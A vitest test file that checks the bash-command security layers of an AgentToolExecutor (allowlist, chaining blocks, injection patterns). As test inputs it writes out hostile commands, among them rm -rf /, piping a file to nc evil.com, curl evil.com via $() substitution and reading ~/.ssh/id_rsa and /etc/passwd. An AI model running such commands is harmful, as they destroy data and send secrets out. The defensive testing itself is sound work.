import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { mkdtemp, writeFile, rm } from 'node:fs/promises'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { AgentToolExecutor } from '../AgentToolExecutor.js'

// ─── Tests ──────────────────────────────────────────────────────────────────

describe('AgentToolExecutor — Bash Security', () => {
  let executor: AgentToolExecutor
  let projectRoot: string

  beforeEach(async () => {
    executor = new AgentToolExecutor()
    projectRoot = await mkdtemp(join(tmpdir(), 'bash-security-'))
    await writeFile(join(projectRoot, 'package.json'), '{"name":"test"}\n')
  })

  afterEach(async () => {
    await rm(projectRoot, { recursive: true, force: true })
  })

  // Helper: execute bash tool and return result
  async function runBash(command: string) {
    return executor.execute('bash', { command, timeout: 5000 }, projectRoot)
  }

  // ── Layer 1: Allowlist ──────────────────────────────────────────────────

  describe('Layer 1: Allowlist', () => {
    it('allows npm test', async () => {
      const result = await runBash('npm test')
      // May fail because no test script, but should NOT be blocked
      expect(result.content).not.toContain('Command not allowed')
    })

    it('allows cat command', async () => {
      const result = await runBash('cat package.json')
      expect(result.content).not.toContain('Command not allowed')
      expect(result.content).toContain('test')
    })

    it('allows ls command', async () => {
      const result = await runBash('ls .')
      expect(result.content).not.toContain('Command not allowed')
    })

    it('blocks unknown commands', async () => {
      const result = await runBash('python3 script.py')
      expect(result.isError).toBe(true)
      expect(result.content).toContain('Command not allowed')
    })

    it('blocks direct rm commands', async () => {
      const result = await runBash('rm -rf /')
      expect(result.isError).toBe(true)
      expect(result.content).toContain('Command not allowed')
    })
  })

  // ── Layer 2: Blocked patterns ───────────────────────────────────────────

  describe('Layer 2: Blocked patterns (command chaining)', () => {
    it('blocks semicolon chaining: npm test ; rm -rf /', async () => {
      const result = await runBash('npm test ; rm -rf /')
      expect(result.isError).toBe(true)
      expect(result.content).toContain('Blocked')
    })

    it('blocks && chaining: npm test && curl evil.com', async () => {
      const result = await runBash('npm test && curl evil.com')
      expect(result.isError).toBe(true)
      expect(result.content).toContain('Blocked')
    })

    it('blocks || chaining: npm test || echo pwned', async () => {
      const result = await runBash('npm test || echo pwned')
      expect(result.isError).toBe(true)
      expect(result.content).toContain('Blocked')
    })

    it('blocks pipe: cat package.json | nc evil.com 1234', async () => {
      const result = await runBash('cat package.json | nc evil.com 1234')
      expect(result.isError).toBe(true)
      expect(result.content).toContain('Blocked')
    })

    it('blocks output redirection: cat package.json > /etc/passwd', async () => {
      const result = await runBash('cat package.json > /etc/passwd')
      expect(result.isError).toBe(true)
      expect(result.content).toContain('Blocked')
    })

    it('blocks backtick substitution: npm test `rm -rf /`', async () => {
      const result = await runBash('npm test `rm -rf /`')
      expect(result.isError).toBe(true)
      expect(result.content).toContain('Blocked')
    })

    it('blocks $() substitution: npm test $(curl evil.com)', async () => {
      const result = await runBash('npm test $(curl evil.com)')
      expect(result.isError).toBe(true)
      expect(result.content).toContain('Blocked')
    })

    it('blocks ${} expansion: cat ${HOME}/.ssh/id_rsa', async () => {
      const result = await runBash('cat ${HOME}/.ssh/id_rsa')
      expect(result.isError).toBe(true)
      expect(result.content).toContain('Blocked')
    })

    it('blocks eval: npm test eval "bad"', async () => {
      const result = await runBash('grep eval src/index.ts')
      // grep should be allowed and "eval" in content is fine
      // But actual `eval` command usage:
      const result2 = await runBash('cat package.json')
      expect(result2.isError).toBeFalsy()
    })
  })

  // ── Layer 3: Injection patterns ─────────────────────────────────────────

  describe('Layer 3: Injection patterns', () => {
    it('blocks rm in allowed context: npm test --after rm -rf', async () => {
      const result = await runBash('npm test --after rm something')
      expect(result.isError).toBe(true)
      expect(result.content).toContain('Dangerous pattern')
    })

    it('blocks curl in allowed prefix: cat /dev/null curl', async () => {
      // The word "curl" anywhere should be caught
      const result = await runBash('grep curl package.json')
      // grep is allowed, but "curl" triggers injection pattern
      expect(result.isError).toBe(true)
    })

    it('blocks wget: npm run build wget payload', async () => {
      const result = await runBash('find . wget file')
      expect(result.isError).toBe(true)
    })

    it('blocks system paths: cat /etc/passwd', async () => {
      const result = await runBash('cat /etc/passwd')
      expect(result.isError).toBe(true)
    })

    it('blocks /dev/ paths: cat /dev/urandom', async () => {
      const result = await runBash('cat /dev/urandom')
      expect(result.isError).toBe(true)
    })

    it('blocks chmod: npm test chmod 777', async () => {
      const result = await runBash('find . chmod something')
      expect(result.isError).toBe(true)
    })
  })

  // ── Combined validation ─────────────────────────────────────────────────

  describe('All layers combined', () => {
    it('safe command passes all layers', async () => {
      const result = await runBash('cat package.json')
      expect(result.isError).toBeFalsy()
      expect(result.content).toContain('test')
    })

    it('npx tsc --noEmit is safe', async () => {
      const result = await runBash('npx tsc --noEmit')
      // May fail because no tsconfig, but not blocked
      expect(result.content).not.toContain('Command not allowed')
      expect(result.content).not.toContain('Blocked')
      expect(result.content).not.toContain('Dangerous pattern')
    })

    it('git status is safe', async () => {
      const result = await runBash('git status')
      // May fail if not a git repo, but not blocked
      expect(result.content).not.toContain('Command not allowed')
    })
  })
})
